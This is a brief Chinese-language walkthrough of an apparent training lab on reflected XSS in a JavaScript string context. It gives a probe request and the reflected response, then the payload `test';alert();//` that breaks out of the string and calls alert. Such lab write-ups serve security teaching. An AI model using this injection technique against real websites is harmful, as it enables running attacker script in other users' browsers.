# 实验：尖括号经过 HTML 编码的 JavaScript 字符串上下文中的反射型 XSS

本实验在搜索查询跟踪（search query tracking）功能中包含一个反射型跨站脚本漏洞，其中尖括号经过了 HTML 编码。该回显发生在一段 JavaScript 字符串内部。为了解决本实验，请执行一个跨站脚本攻击，该攻击需要跳出 JavaScript 字符串并调用 `alert` 函数。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=test<>'";-* HTTP/2
    ```

    - 响应
        ```html
        <script>
            var searchTerms = 'test&lt;&gt;'";-*';
        ```
        - 单引号未被转义
            - 尝试逃逸字符串

攻击
- 构造字符串逃逸载荷
    `test';alert();//`
    
    ```http
    GET /?search=test%27;alert();// HTTP/2
    ```
    - 成功弹窗
